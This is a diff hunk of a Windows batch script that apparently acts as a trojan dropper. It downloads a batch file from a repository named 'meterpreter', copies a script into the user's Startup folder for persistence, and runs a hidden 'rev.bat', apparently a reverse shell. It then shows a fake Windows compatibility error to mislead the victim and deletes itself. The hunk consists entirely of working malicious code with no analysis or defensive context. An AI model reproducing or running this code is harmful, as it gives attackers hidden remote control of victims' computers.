@@ -28,6 +28,5 @@ curl https://raw.githubusercontent.com/0x2034/meterpreter/main/nihbtdtdow.bat -o
 move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden"
 echo The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program ........
-start explorer.exe
 timeout /t 3 >nul
 del "%~f0"
